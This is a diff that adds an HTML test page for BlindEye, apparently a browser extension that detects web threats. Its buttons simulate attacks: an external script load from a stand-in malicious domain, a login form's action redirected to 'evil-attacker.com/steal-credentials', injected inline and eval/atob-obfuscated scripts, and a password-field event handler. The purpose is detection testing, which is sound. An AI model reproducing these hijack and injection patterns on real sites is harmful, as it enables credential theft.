@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlindEye - Test Page</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        h1 {
+            color: #2d3748;
+            margin-bottom: 10px;
+            font-size: 32px;
+        }
+
+        .subtitle {
+            color: #718096;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+
+        .alert {
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+
+        .alert strong {
+            color: #92400e;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .section {
+            margin-bottom: 40px;
+        }
+
+        .section h2 {
+            color: #2d3748;
+            margin-bottom: 16px;
+            font-size: 20px;
+            border-bottom: 2px solid #e2e8f0;
+            padding-bottom: 8px;
+        }
+
+        .test-group {
+            background: #f7fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .test-group h3 {
+            color: #4a5568;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+
+        .test-group p {
+            color: #718096;
+            margin-bottom: 16px;
+            line-height: 1.6;
+        }
+
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button.danger {
+            background: linear-gradient(135deg, #f56565 0%, #c53030 100%);
+        }
+
+        button.danger:hover {
+            box-shadow: 0 4px 12px rgba(245, 101, 101, 0.4);
+        }
+
+        .form-test {
+            background: white;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 16px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .status {
+            background: #d1fae5;
+            border: 2px solid #10b981;
+            border-radius: 8px;
+            padding: 12px;
+            color: #065f46;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .status.show {
+            display: block;
+        }
+
+        code {
+            background: #2d3748;
+            color: #48bb78;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 13px;
+        }
+
+        .instructions {
+            background: #e0e7ff;
+            border-left: 4px solid #667eea;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 30px;
+        }
+
+        .instructions ol {
+            margin-left: 20px;
+            margin-top: 12px;
+        }
+
+        .instructions li {
+            color: #4c51bf;
+            margin-bottom: 8px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ BlindEye Test Page</h1>
+        <p class="subtitle">Use this page to test BlindEye's threat detection capabilities</p>
+
+        <div class="alert">
+            <strong>⚠️ Important:</strong>
+            Make sure BlindEye extension is installed and enabled. Watch the extension icon turn RED when threats are detected!
+        </div>
+
+        <div class="section">
+            <h2>Test Cases</h2>
+
+            <div class="test-group">
+                <h3>Test 1: External Script Injection</h3>
+                <p>This test simulates an attacker injecting a malicious external script into the page.</p>
+                <button onclick="testExternalScript()" class="danger">Inject External Script</button>
+                <p style="margin-top: 12px; font-size: 13px; color: #718096;">
+                    Expected: <code>SCRIPT_INJECTION</code> alert with CRITICAL severity
+                </p>
+            </div>
+
+            <div class="test-group">
+                <h3>Test 2: Inline Script Injection</h3>
+                <p>This test adds suspicious inline JavaScript code to the page.</p>
+                <button onclick="testInlineScript()" class="danger">Inject Inline Script</button>
+                <p style="margin-top: 12px; font-size: 13px; color: #718096;">
+                    Expected: <code>SCRIPT_INJECTION</code> alert with HIGH severity
+                </p>
+            </div>
+
+            <div class="test-group">
+                <h3>Test 3: Form Hijacking</h3>
+                <p>This test modifies the form action URL to simulate credential stealing.</p>
+                <button onclick="testFormHijack()" class="danger">Hijack Form Below</button>
+                <p style="margin-top: 12px; font-size: 13px; color: #718096;">
+                    Expected: <code>FORM_HIJACK</code> alert with CRITICAL severity
+                </p>
+                
+                <div class="form-test">
+                    <form id="test-form" action="/legitimate-endpoint">
+                        <input type="email" placeholder="Email" name="email" required>
+                        <input type="password" placeholder="Password" name="password" required>
+                        <button type="submit">Login (Safe Form)</button>
+                    </form>
+                </div>
+            </div>
+
+            <div class="test-group">
+                <h3>Test 4: Event Handler Injection</h3>
+                <p>This test adds a suspicious event handler to an input field.</p>
+                <button onclick="testEventHandler()" class="danger">Add Malicious Handler</button>
+                <p style="margin-top: 12px; font-size: 13px; color: #718096;">
+                    Expected: <code>EVENT_HANDLER_INJECTION</code> alert with HIGH severity
+                </p>
+            </div>
+
+            <div class="test-group">
+                <h3>Test 5: Obfuscated Code</h3>
+                <p>This test injects code with common obfuscation techniques (eval, atob).</p>
+                <button onclick="testObfuscation()" class="danger">Inject Obfuscated Code</button>
+                <p style="margin-top: 12px; font-size: 13px; color: #718096;">
+                    Expected: <code>SCRIPT_INJECTION</code> alert with CRITICAL severity (obfuscated)
+                </p>
+            </div>
+        </div>
+
+        <div class="instructions">
+            <strong>📋 How to Use This Test Page:</strong>
+            <ol>
+                <li>Make sure <strong>BlindEye extension is installed</strong> in Chrome</li>
+                <li>Watch the <strong>BlindEye icon</strong> in your browser toolbar</li>
+                <li>Click any <strong>red button</strong> above to simulate an attack</li>
+                <li>The BlindEye icon should <strong>turn RED</strong> 🔴</li>
+                <li>Click the extension icon to see <strong>threat details</strong></li>
+                <li>Open <strong>browser console (F12)</strong> to see detection logs</li>
+                <li>Test multiple scenarios to see different threat types</li>
+            </ol>
+        </div>
+
+        <div id="status" class="status">
+            ✅ Test executed! Check BlindEye extension icon for alerts.
+        </div>
+    </div>
+
+    <script>
+        function showStatus() {
+            const status = document.getElementById('status');
+            status.classList.add('show');
+            setTimeout(() => {
+                status.classList.remove('show');
+            }, 3000);
+        }
+
+        function testExternalScript() {
+            console.log('[TEST] Injecting external script...');
+            const script = document.createElement('script');
+            script.src = 'https://suspicious-unknown-domain.com/malicious.js';
+            document.body.appendChild(script);
+            showStatus();
+        }
+
+        function testInlineScript() {
+            console.log('[TEST] Injecting inline script...');
+            const script = document.createElement('script');
+            script.textContent = `
+                // Simulated malicious code
+                function stealData() {
+                    const passwords = document.querySelectorAll('input[type="password"]');
+                    // This would normally send data to attacker
+                    console.log('Malicious: Attempting to steal data');
+                }
+                stealData();
+            `;
+            document.body.appendChild(script);
+            showStatus();
+        }
+
+        function testFormHijack() {
+            console.log('[TEST] Hijacking form action...');
+            const form = document.getElementById('test-form');
+            form.action = 'https://evil-attacker.com/steal-credentials';
+            showStatus();
+            alert('Form action changed! Check BlindEye for alert.\n\nOriginal: /legitimate-endpoint\nNew: https://evil-attacker.com/steal-credentials');
+        }
+
+        function testEventHandler() {
+            console.log('[TEST] Injecting event handler...');
+            const input = document.querySelector('input[type="password"]');
+            if (input) {
+                input.setAttribute('onkeyup', 'maliciousFunction()');
+                showStatus();
+            }
+        }
+
+        function testObfuscation() {
+            console.log('[TEST] Injecting obfuscated code...');
+            const script = document.createElement('script');
+            script.textContent = `
+                // Obfuscated malicious code
+                eval(atob('Y29uc29sZS5sb2coIk1hbGljaW91cyBjb2RlIGV4ZWN1dGVkIik='));
+                const data = String.fromCharCode(109, 97, 108, 105, 99, 105, 111, 117, 115);
+            `;
+            document.body.appendChild(script);
+            showStatus();
+        }
+
+        // Prevent actual form submission
+        document.getElementById('test-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            alert('Form submission prevented (this is just a test!)');
+        });
+
+        console.log('%c🛡️ BlindEye Test Page Loaded', 'color: #667eea; font-size: 16px; font-weight: bold');
+        console.log('%cClick the buttons above to test threat detection', 'color: #718096; font-size: 14px');
+    </script>
+</body>
+</html>
